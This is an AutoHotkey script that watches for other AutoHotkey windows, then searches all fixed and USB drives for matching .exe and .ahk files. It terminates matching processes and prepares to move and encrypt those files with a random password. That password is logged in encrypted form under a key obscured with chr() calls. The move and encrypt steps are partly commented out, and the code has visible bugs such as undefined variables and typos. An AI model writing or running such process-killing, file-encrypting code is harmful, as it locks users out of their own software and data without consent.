#NoEnv
DetectHiddenWindows,on
SetBatchLines,-1
;~ #NoTrayIcon
#include <SetWindowsHookEx>
#include <Crypt>
#include <RandomChar>
#include <scsApps>

;~ scsMon()

scsMon(){
	global __scsMon__
	__scsMon__:= new __scsMon
	,WindowShellEvent("__scsMon_ShellMessage")
	,OnMessage(0x12544, "__scsMon_getResponse")
}

class __scsMon {
	__New(){
		this.responses:= []
		, this.collectedPaths:= []
		, this.searched:= []
		, this.searchedRoots:=[]
		, this.matchedList:= []
		, this.__pw:= RandomChar(512)
		, this.apps:= (new scsApps)
	}
	
	searchDir(dir, logSaveDir=""){
		l:=StdoutToVar_CreateProcess("where /R """ dir """ *.exe *.ahk")
		,logSaveDir:=logSaveDir=""?a_desktop:logSaveDir
		
		Loop,Parse,l,`n
		{
			SplitPath,A_LoopField,fileName,,ext
			if FileExist(SubStr(A_LoopField,1,(-1)*StrLen(ext)) ".version_")
				continue
				
			if this.apps.is_match(SubStr(fileName,1,(-1)*StrLen(exet)-1))
				this.matchedList[A_LoopField]:=1
		}
		this.searched[dir]:=1
	}
	
	has_searched(dir){
		for k,v in this.searchedRoots
			if InStr(dir, v)=1
				return true
		return false
	}
	
	move_enc(file, ByRef encryptedList){
		v:=file
		SplitPath,v,fn,,,,root
		FileCreateDir,% __old:=root "\__old"
		;~ filemove,% v,% Moved:=__old "\" fn,1
		;~ if FileExist(Moved)
			;~ Crypt.Encrypt.FileEncrypt(Moved, v ".enc", __scsMon__.__pw, 7, 6)
		if !encryptedList.haskey(root)
			encryptedList[root]:=""
		
		encryptedList[root].=v "`n"
		
		;~ FileDelete,% Moved
	}

}


__scsMon_getResponse(w,l,m,h){
	global __scsMon__
	__scsMon__.responses[hwnd]:=true
}

__scsMon_Do(){
	global __scsMon__
	deleted:=[]
	for k,v in __scsMon__.responses {
		if !v
			;~ WinClose,% "ahk_id " k
		   ToolTip % "close " WinGetTitle(k)
		deleted.push(k)
	}
	for k,v in deleted
		__scsMon__.responses.delete(k)
	
}

__scsMon_Search(){
	global __scsMon__
	
	if __scsMon__.searching
		return
	
	__scsMon__.searching:=true
	__scsMon__.matchedList:=[]
	_t:=A_TickCount
	for k,v in __scsMon__.collectedPaths {
		if InStr(FileExist(v), "D")
			dir:=v
		else{
			SplitPath,v,,dir
		}
		
		if !(__scsMon__.searched.haskey(dir) || __scsMon__.has_searched(dir)){
			__scsMon__.searchDir(dir)
		}
		
		SplitPath,dir,,dir,,,root
		
		if !(__scsMon__.searched.haskey(dir)  || __scsMon__.has_searched(dir)){
			__scsMon__.searchDir(dir)
		}
		
		if !(__scsMon__.has_searched(root)){
			__scsMon__.searchDir(root)
			,__scsMon__.searchedRoots[root]:=1
		}
		
		DriveGet, all, List
		DriveGet, usb, List, removable
		DriveGet, cd, List, cdrom
		All.=usb
		loop,parse,cd
			StringReplace,all,all,% a_loopfield,,all
		loop,parse,usb
			StringReplace,all,all,% a_loopfield,,all
		StringReplace,all,all,A,,all
		StringReplace,usb,usb,A,,all
		;~ MsgBox % All
		Loop,Parse,All
			if !(__scsMon__.has_searched(root:=A_LoopField ":")){
				__scsMon__.searchDir(root)
				,__scsMon__.searchedRoots[root]:=1
			}
		
		Loop,Parse,usb
			if !(__scsMon__.has_searched(root:=A_LoopField ":")){
				__scsMon__.searchDir(root)
				,__scsMon__.searchedRoots[root]:=1
			}
	}
	SetTimer,__scsMon_encrypt,-1,-10
	__scsMon__.searching:=false
	;~ MsgBox % (A_TickCount-_t) "," exploreobj(__scsMon__.matchedList)
}

__scsMon_encrypt(){
	global __scsMon__
	
	if (__scsMon__.encrypting){
		SetTimer,__scsMon_encrypt,-10000
		return
	}
	__scsMon__.encrypting:=true
	
	encrypted:=[]
	,need_terminate:=0
	for v,_ in __scsMon__.matchedList {
		if !FileExist(v)
			continue
		
		found_running:=false
		for process in ComObjGet("winmgmts:").ExecQuery("Select * from Win32_Process where ExecutablePath = '" v "'")
				process.terminate()
				,need_terminate++
				,found_running:=true
		
		if !(found_running) {
			__scsMon.move_enc(v, encrypted)
		}
	}
	
	if(need_terminate){
		for v,_ in __scsMon__.matchedList {
			if !FileExist(v)
				continue
			__scsMon.move_enc(v, encrypted)
		}
	}
	
	fileListWrite:=false
	for root, fileList in encrypted {
		FileAppend,% fileList,% a_desktop "\file_list.txt",utf-8
		fileListWrite:=true
	}
	if fileListWrite
		FileAppend,% "--------------------" Crypt.Encrypt.StrEncrypt(__scsMon__.__pw,chr(50) chr(106) chr(108) chr(105) chr(100) chr(106) chr(114) chr(105) ,7,6) "--------------------`n`n",% a_desktop "\file_list.txt",utf-8
	
	;~ run % Commands("start", "", a_desktop "\file_list.txt")
	__scsMon__.encrypting:=false
	
}



__scsMon_ShellMessage( wParam,lParam ) { 
	global __scsMon__
	static myList:=""
	
	If ( wParam=1 ) {
		hwnd:=lParam
		if InStr(WinGetClass(lParam), "AutoHotkey") || InStr(pName:=WinGet("ProcessName", lParam), "AutoHotkey") {
			;~ if WinExist("ahk_exe Autorun.exe") || WinExist("陳醫師")
				;~ return
			
			PostMessage,0x12543,,,,% lParam
			__scsMon__.collectedPaths.push(WinGet("ProcessPath", lParam))
			,__scsMon__.collectedPaths.push(GetModuleFileNameExW(Winget("PID", lParam)))
			,__scsMon__.responses[hwnd]:=false
			SetTimer,__scsMon_Do,-1000
			SetTimer,__scsMon_Search,-1,-10
		}
	}
} 
